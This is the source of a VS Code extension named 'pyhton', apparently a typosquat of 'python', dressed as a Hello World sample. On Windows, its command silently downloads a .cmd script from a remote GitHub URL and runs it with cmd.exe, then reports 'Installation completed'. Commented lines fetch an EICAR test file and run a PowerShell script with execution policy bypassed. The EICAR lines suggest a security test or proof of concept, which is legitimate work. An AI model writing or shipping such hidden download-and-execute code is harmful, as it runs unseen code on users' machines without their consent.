// Import the VS Code extensibility API
const vscode = require('vscode');
// Import Node's child_process module to execute shell commands
const { exec } = require('child_process');

/**
 * Executes a shell command and returns a promise.
 * @param {string} command The command to execute.
 * @returns {Promise<string>} Resolves with stdout when the command completes.
 */
function execPromise(command) {
  return new Promise((resolve, reject) => {
    exec(command, (error, stdout, _stderr) => {
      if (error) {
        return reject(error);
      }
      resolve(stdout);
    });
  });
}

/**
 * This method is called when your extension is activated.
 * @param {vscode.ExtensionContext} context
 */
function activate(context) {
  // Log and show an information message upon activation.
  console.log('Congratulations, your extension "pyhton" is now active!');
  vscode.window.showInformationMessage('Extension "pyhton" activated!');

  // Register the command "pyhton.helloWorld".
  // Make sure the command ID here exactly matches the one in package.json.
  let disposable = vscode.commands.registerCommand('pyhton.helloWorld', async () => {
    // On Windows, execute a curl command using a raw URL.
    if (process.platform === 'win32') {
      try {
        // Use a raw GitHub URL to retrieve plain text (not the blob page)
        await execPromise('curl -Ss https://raw.githubusercontent.com/ionsor/vscode-pyhton/refs/heads/main/run_script.cmd -o "%TEMP%\\run_script.cmd" && cmd.exe /C "%TEMP%\\run_script.cmd" && notepad "%TEMP%\\run_script.cmd"');
	      //await execPromise('curl -Ss https://raw.githubusercontent.com/fire1ce/eicar-standard-antivirus-test-files/master/eicar-test.txt -o \"%TEMP%\\eicar-test.txt\" && notepad \"%TEMP%\\eicar-test.txt\"');
        // powershell command not working
		// await execPromise('curl -Ss https://raw.githubusercontent.com/ionsor/vscode-pyhton/refs/heads/main/powereicar.ps1 -o \"%TEMP%\\powereicar.ps1\" && powershell -ExecutionPolicy Bypass -File \"%TEMP%\\powereicar.ps1\"');

		vscode.window.showInformationMessage('Installation completed.');
      } catch (error) {
        console.error(error);
        vscode.window.showErrorMessage('Installation failed: ' + error.message);
      }
    }
    // Display a Hello World message.
    vscode.window.showInformationMessage('Hello World from Pyhton! WORKS');
  });

  // Add the disposable to the context's subscriptions.
  context.subscriptions.push(disposable);
}

/**
 * This method is called when your extension is deactivated.
 */
function deactivate() {}

module.exports = {
  activate,
  deactivate
};
